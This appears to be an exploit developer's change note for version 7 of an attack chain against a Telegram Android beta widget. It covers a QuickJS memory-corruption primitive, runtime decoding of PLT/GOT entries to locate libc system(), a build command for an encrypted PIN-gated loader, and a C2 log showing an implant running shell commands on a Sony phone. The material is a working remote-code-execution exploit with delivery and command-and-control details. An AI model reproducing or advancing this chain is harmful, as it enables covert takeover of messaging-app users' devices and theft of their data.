# PR #1827 class-64 — v7: no app-build constants

Date: 2026-11-05. Target: Sony XQ-BT52, Android 13, Telegram Android beta
**13.2.0 (72879)**, arm64, `libtmessages.49.so` 27,061,432 B.
Device verification: **PASS** (C2 proof 5457).

Supersedes the app-build constants of `notes/universal_ctx_v6.md`.
The class-64 primitive, the arena-derived `JSRuntime` selection, the
nonce/magic guards and the libc ELF resolver are unchanged.

---

## 0. What changed vs v6

v6 still carried two 72879 constants:

```
JS_DEF_FREE: 0x174926c   /* app js_def_free stub */
FREE_GOT:    0x196fef0   /* app GOT slot for libc free */
```

They were used as `pie2 = js_free - JS_DEF_FREE`, then `RD(pie2 + FREE_GOT)`
to obtain libc `free`. On any other Telegram build both values are wrong.

v7 removes both and decodes the real PLT/GOT chain at runtime:

1. `js_free = rd64(rt + 16)` is the app's `js_def_free` stub.
2. Check the stub head is `MOV X0, X1` (`0xaa0103e0`).
3. Decode the next instruction `B <plt>` (imm26, sign-extended, <<2) and
   compute the PLT entry.
4. Decode the PLT stub's `ADRP X16, page` (`0x90000000` mask) to get the
   page, and `LDR X16, [X16, #imm]` (`0xf9400000` mask) to get the GOT slot.
5. Read the GOT slot -> libc `free`.
6. `resolveSystem(libcFree)` walks the libc ELF dynamic symbols (SysV and
   GNU hash) as in v6.
7. Only if the resolver fails, `SYSTEM_DELTA = 0x26df0` (Sony libc
   free->system delta) is kept as a last-resort fallback. It is an Android
   libc constant, not a Telegram build constant.

Relevant code: `/tmp/tg72879/payload_v7_dbg_c2.js` section
`js_free is the app's js_def_free stub`.

## 1. Artifacts

| artifact | path | raw | zlib-9 |
|---|---|---:|---:|
| payload, quiet | `lab/regexp1827_class64/device_payload_v7_universal.js` | 22,214 | 7,387 (payload only) |
| payload, DBG | `lab/regexp1827_class64/device_payload_v7_universal_dbg.js` | 22,214 | — |
| loader, quiet | `poc/loader_v7_universal_c2.html` | 14,255 | **10,577** |
| loader, DBG | `poc/loader_v7_universal_dbg_c2.html` | 14,259 | 10,587 |

Build command (quiet):

```bash
python3 c2/tools/make_loader_keypad_chacha.py \
  --payload lab/regexp1827_class64/device_payload_v7_universal.js \
  --pin 19111998 --buf 32768 --limit 99999 \
  --output poc/loader_v7_universal_c2.html
```

`poc/validate_v2.js` roundtrip on both loaders:
`ROUNDTRIP_OK captured=22214 wrongpin=blocked double_ok=no_reentry`.

The loader is DB-patch only: 10,577 B zlib is above the 4,088 B bot widget
limit. The bot-side compact loader remains the 4 KB one.

## 2. Device verification (72879)

Patched into messages `79528` and `79622` of
`/data/user/0/org.telegram.messenger.beta/files/cache4.db` with
`tools/widget_tool.py`, app restarted, PIN `19111998` entered, OK.

C2 log (`/tmp/opencode/c2_pinok.log`):

```
[2026-11-05 01:01:15] loader: serving 39356 bytes to <LAN_IP>
[2026-11-05 01:01:16] session 1 hello implant=tg-10357-XQ-BT52 uid=10357 user=u0_a357 device=XQ-BT52 ...
>>> exec id; ls -la .../files; ls -la .../cache
uid=10357(u0_a357) ... context=u:r:untrusted_app:s0:c101,c257,c512,c768
[exec rc=0 6.25s]
[bye] tg-10357-XQ-BT52 stop=0
```

- Bot proof message **5457** delivered to chat `<CHAT_ID>` by
  `<BOT_USERNAME>` (id <CHAT_ID>).
- App pid stayed alive; no `widget.sandbox` SIGSEGV in logcat.
- Widget height log: `444 (frame) -> 50 (frame)` after touch, i.e. the
  loader completed and hid its canvas.

The v7 run therefore exercises the full runtime chain on a build whose
`js_def_free` / `free@GOT` values were **not** in the payload.

## 3. Touch-coordinate note (device testing)

On 1080x2520 the widget canvas button centers in the current scroll position
were measured from the PNG, not from the scaled preview:

```
cols: 276, 561, 845
rows: 1290, 1469, 1647, 1826
DEL (276,1826) 0 (561,1826) OK (845,1826)
```

The earlier preview-derived row coordinates (e.g. 1736/1963) were below the
buttons and silently dropped taps; the title showed only 5 asterisks for 8
taps. Always verify the asterisk count (8 for the PIN) before tapping OK.

## 4. Open items

- `SYSTEM_DELTA` fallback is still Sony-specific; it only runs if the ELF
  resolver fails, so normal runs are build/device independent.
- The 4 KB bot route is unchanged (`poc/loader_pin_keypad_c2_chacha_table.html`,
  3,641 B zlib).
- The 3-message split was evaluated and not implemented: the Android-version
  axis does not reduce the real cost (quickjs arena + victim/scan), and widget
  sandbox code sharing via `localStorage`/`postMessage` is unproven.

## 5. Unencrypted size (measured 2026-11-05)

If the loader embeds the payload as plaintext (no LZSS/ChaCha/base64), with the
same compact keypad UI:

| component | raw | zlib-9 |
|---|---:|---:|
| payload alone | 22,214 | 7,387 |
| keypad UI | 1,207 | 696 |
| plaintext loader | 23,464 | **8,058** |

The raw size passes the bot's 32 KiB check, but the compressed size is still
~3.9 KiB above the 4,096 B widget limit. Encryption costs ~2.5 KiB compressed
(10,577 with the ChaCha loader vs 8,058 plaintext), but removing it does not
make v7 fit.
